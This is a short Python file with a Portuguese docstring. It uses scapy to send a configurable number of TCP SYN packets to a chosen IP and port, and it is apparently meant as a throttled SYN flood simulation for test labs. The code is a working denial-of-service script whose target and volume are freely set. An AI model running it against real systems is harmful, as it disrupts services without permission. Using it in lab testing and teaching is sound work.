from __future__ import annotations

import time
from dataclasses import dataclass

from scapy.all import IP, TCP, send


@dataclass(frozen=True)
class SynFloodConfig:
    target_ip: str
    target_port: int
    max_packets: int = 100
    delay_s: float = 0.05


def syn_flood_simulation(cfg: SynFloodConfig) -> tuple[int, float]:
    """
    Simulação controlada de SYN flood.
    Envia pacotes TCP SYN sem completar o handshake.
    Usar apenas em ambientes de teste (localhost / VM).
    """
    sent = 0
    t0 = time.time()

    for _ in range(cfg.max_packets):
        pkt = IP(dst=cfg.target_ip) / TCP(
            dport=cfg.target_port,
            flags="S",   # SYN
        )
        send(pkt, verbose=False)
        sent += 1
        if cfg.delay_s > 0:
            time.sleep(cfg.delay_s)

    elapsed = time.time() - t0
    return sent, elapsed
